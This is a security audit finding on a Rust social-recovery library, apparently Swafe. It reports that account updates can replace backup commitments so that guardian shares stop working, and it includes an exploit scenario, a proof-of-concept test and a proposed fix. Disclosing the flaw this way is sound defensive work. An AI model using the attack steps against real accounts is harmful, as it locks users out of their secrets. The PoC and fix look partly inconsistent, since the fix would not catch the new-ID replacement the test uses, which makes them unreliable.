## Title
Account Update Verification Allows Modification of Backup Commitments Leading to Permanent Recovery Lockout

## Summary
The `verify_update()` function in `AccountUpdateV0` accepts arbitrary modifications to the `backups` field without validating that existing backup commitments (`comms` vector) remain unchanged. An attacker with temporary access to the signing key can replace legitimate backups with modified versions containing different commitments, permanently invalidating guardian shares and making account recovery impossible.

## Impact
**High**

## Finding Description

**Location:** The vulnerability exists in the account update verification logic: [1](#0-0) 

**Intended Logic:** The account update verification should ensure that critical recovery-related state, particularly backup commitments, cannot be arbitrarily modified in ways that would break the recovery mechanism. The `comms` vector in each `BackupCiphertext` contains verification keys and share hashes that guardians' shares must match during recovery.

**Actual Logic:** The `verify_update()` function only verifies that:
1. The version counter increments by exactly 1
2. The signature is valid using the old verification key

It then returns the entire new state as-is (line 800: `Ok(st)`), accepting any modifications to the `backups` field including changes to backup commitments. During recovery, shares are validated against these commitments: [2](#0-1) [3](#0-2) 

**Exploit Scenario:**
1. Attacker gains temporary access to the account's signing key (e.g., via malware, device compromise, or memory extraction)
2. Attacker creates a new `BackupCiphertext` with different `comms` values (different verification keys and share hashes)
3. Attacker constructs an `AccountUpdate` replacing the legitimate backup with the malicious one in the `backups` vector
4. Attacker signs the update with the compromised signing key
5. Contract accepts the update via `update_account()` action: [4](#0-3) 
6. The malicious backup with modified commitments is now stored on-chain
7. When the legitimate user loses access to their MSK and attempts recovery, guardians submit their original shares
8. Share validation fails because signatures don't match the new verification keys and hashes don't match the new commitments
9. Recovery is permanently impossible; the account and secrets are frozen

**Security Failure:** This breaks the fundamental security invariant that legitimate guardian shares, once distributed, should enable recovery when the threshold is met. The recovery mechanism becomes useless if backups can be tampered with to invalidate existing shares.

## Impact Explanation

**Affected Assets:**
- Master Secret Keys (MSK) used to decrypt account secrets
- All encrypted data protected by those keys
- Potentially cryptocurrency funds or other assets tied to the account

**Severity of Damage:**
- **Permanent loss of access:** Once the backup commitments are modified and the user loses their MSK, there is no way to recover. The account is permanently frozen.
- **Defeat of recovery mechanism:** The entire purpose of the social recovery system is to provide resilience against key loss. This vulnerability completely undermines that protection.
- **Asymmetric attack surface:** The attacker only needs temporary access to the signing key (which is in memory during normal operations), not the more carefully guarded MSK.

**System Impact:**
This matches the in-scope impact criteria: "Permanent freezing of secrets or accounts (requiring a hard fork or intervention to fix)." Without the ability to recover through guardians, users are permanently locked out of their accounts.

## Likelihood Explanation

**Who Can Trigger:**
Any attacker who gains temporary access to a user's signing key can execute this attack. This is more feasible than MSK compromise because:
- Signing keys are held in memory during normal account operations
- They're used frequently for signing updates
- Modern malware can extract keys from process memory

**Conditions Required:**
- Temporary signing key compromise (realistic via malware, phishing, or social engineering)
- User eventually loses access to their MSK (the scenario recovery is designed for)
- No unusual timing or blockchain state required

**Frequency:**
- Can be executed at any time after signing key compromise
- The attack has lasting effect even if the signing key compromise is temporary
- Could affect multiple users if malware targets Swafe users specifically

The vulnerability is highly likely to be exploited because:
1. Signing key compromise is a realistic threat vector
2. The attack leaves no immediate visible trace
3. The damage only manifests when recovery is needed (at which point it's too late)
4. The impact is severe (permanent lockout)

## Recommendation

Implement integrity checks for the `backups` field during account updates. Specifically:

1. **Prevent modification of existing backups:** The verification logic should ensure that backups can only be added or removed (by ID), not modified. Add a check in `verify_update()`:
   ```rust
   // Verify backups haven't been tampered with
   for backup in &st.backups {
       let backup_id = backup.id();
       if let Some(old_backup) = old.backups.iter().find(|b| b.id() == backup_id) {
           // If a backup with this ID existed before, it must be identical
           if backup != old_backup {
               return Err(SwafeError::InvalidOperation(
                   "Cannot modify existing backup commitments".to_string()
               ));
           }
       }
   }
   ```

2. **Alternative approach:** Make backups append-only by tracking backup IDs in a separate immutable set, or require explicit removal transactions that preserve integrity.

3. **Defense in depth:** Consider separating the signing key used for general updates from a more carefully protected key used for recovery-related changes.

## Proof of Concept

**Test File:** `lib/src/account/tests.rs`

**Test Function:** Add the following test to demonstrate the vulnerability:

```rust
#[test]
fn test_backup_comms_modification_breaks_recovery() {
    let mut rng = OsRng;

    // Setup: Create owner and guardians
    let mut owner = AccountSecrets::gen(&mut rng).unwrap();
    let guardian1 = AccountSecrets::gen(&mut rng).unwrap();
    let guardian2 = AccountSecrets::gen(&mut rng).unwrap();
    let guardian3 = AccountSecrets::gen(&mut rng).unwrap();
    
    let guardians_states = vec![
        guardian1.state(&mut rng).unwrap(),
        guardian2.state(&mut rng).unwrap(),
        guardian3.state(&mut rng).unwrap(),
    ];
    
    // Create initial account state
    let initial_update = owner.update(&mut rng).unwrap();
    let mut owner_state = initial_update.verify(None).unwrap();
    
    // Create legitimate backup with guardians (threshold 2 of 3)
    let test_data = TestData { value: "secret".to_string() };
    let legitimate_backup = owner.backup(
        &mut rng,
        &test_data,
        Metadata::new("Backup".to_string(), "Test".to_string()),
        &guardians_states,
        2,
    ).unwrap();
    
    // Guardians decrypt their shares from legitimate backup
    let share1 = guardian1.decrypt_share_backupy(*owner.acc(), &legitimate_backup).unwrap();
    let share2 = guardian2.decrypt_share_backupy(*owner.acc(), &legitimate_backup).unwrap();
    
    // Add backup to account and upload
    owner.add_backup(legitimate_backup.clone()).unwrap();
    let update1 = owner.update(&mut rng).unwrap();
    owner_state = update1.verify(Some(&owner_state)).unwrap();
    
    // Trigger: Attacker gets signing key and creates malicious update
    // (In reality: malware extracts signing key from memory)
    let attacker_has_signing_key = owner.sig().clone();
    
    // Attacker creates NEW backup with DIFFERENT comms
    let mut malicious_owner = AccountSecrets::gen(&mut rng).unwrap();
    let malicious_backup = malicious_owner.backup(
        &mut rng,
        &test_data,
        Metadata::new("Backup".to_string(), "Test".to_string()),
        &guardians_states,
        2,
    ).unwrap();
    
    // Attacker constructs state with replaced backup
    let AccountState::V0(mut malicious_state) = owner_state.clone();
    malicious_state.cnt += 1;
    malicious_state.backups = vec![malicious_backup.clone()];
    
    // Attacker signs with compromised key
    let malicious_sig = attacker_has_signing_key.sign(&mut rng, &malicious_state);
    let malicious_update = AccountUpdate::V0(AccountUpdateV0 {
        acc: *owner.acc(),
        msg: AccountMessageV0::Update(AccountUpdateFullV0 {
            sig: malicious_sig,
            state: malicious_state,
        }),
    });
    
    // Contract accepts the malicious update!
    let compromised_state = malicious_update.verify(Some(&owner_state)).unwrap();
    
    // Observation: Recovery now fails with legitimate guardian shares
    let owner_state_after = guardian1.state(&mut rng).unwrap();
    let share1_for_recovery = share1.send(&mut rng, &owner_state_after).unwrap();
    let share2_for_recovery = share2.send(&mut rng, &owner_state_after).unwrap();
    
    // Try to recover with legitimate shares - THIS FAILS
    let result: Result<TestData, _> = owner.recover(
        &malicious_backup,
        &[share1_for_recovery, share2_for_recovery],
    );
    
    // Recovery fails because shares don't match modified comms
    assert!(result.is_err());
    // User is permanently locked out - vulnerability confirmed!
}
```

**Setup:** The test creates an account, generates a legitimate backup with guardians, and distributes shares.

**Trigger:** An attacker with the signing key creates a malicious update that replaces the backup with one having different commitments, signs it, and the contract accepts it.

**Observation:** When attempting recovery with the original guardian shares, the operation fails because the shares no longer validate against the modified backup commitments. This demonstrates permanent lockout - the test confirms the vulnerability by showing that legitimate recovery is impossible after the attack.

### Citations

**File:** lib/src/account/v0.rs (L786-801)
```rust
    /// Verify an update to the account returns the new state of the account
    pub(super) fn verify_update(self, old: &AccountStateV0) -> Result<AccountStateV0> {
        match self.msg {
            AccountMessageV0::Update(auth) => {
                let st = auth.state;
                // version must increase by exactly one
                if Some(st.cnt) != old.cnt.checked_add(1) {
                    return Err(SwafeError::InvalidAccountStateVersion);
                }

                // verify signature using old verification key
                old.sig.verify(&auth.sig, &st)?;

                // Return the new state as provided in the update
                Ok(st)
            }
```

**File:** lib/src/backup/v0.rs (L303-309)
```rust
                let id = self.verify(share_v0).ok()?;
                let share: Share = dke.decrypt(&share_v0.ct, aad).ok()?;
                if self.comms[id as usize].hash == hash(&ShareHash { share: &share }) {
                    Some((id, share))
                } else {
                    None
                }
```

**File:** lib/src/backup/v0.rs (L342-354)
```rust
    pub fn verify(&self, share: &GuardianShareV0) -> Result<u32, SwafeError> {
        if share.idx > self.comms.len() as u32 {
            return Err(SwafeError::InvalidShare);
        }
        self.comms[share.idx as usize].vk.verify(
            &share.sig,
            &SignedEncryptedShare {
                ct: &share.ct,
                idx: share.idx,
            },
        )?;
        Ok(share.idx)
    }
```

**File:** contracts/src/lib.rs (L107-134)
```rust
#[action]
fn update_account(
    _ctx: ContractContext,
    mut state: ContractState,
    update_str: String,
) -> ContractState {
    // deserialize the account update from a string,
    let update: AccountUpdate =
        encode::deserialize_str(update_str.as_str()).expect("Failed to decode account update");

    // retrieve the *claimed* account ID
    let account_id = update.unsafe_account_id();

    // retrieve the old account state
    let st_old: Option<AccountState> = state
        .accounts
        .get(account_id.as_ref())
        .map(|bytes| encode::deserialize(&bytes).expect("failed to deserialize account state"));

    // verify the update using the lib
    let st_new = update
        .verify(st_old.as_ref())
        .expect("Failed to verify account update");

    // store the updated account state
    state.set_account(account_id, st_new);
    state
}
```
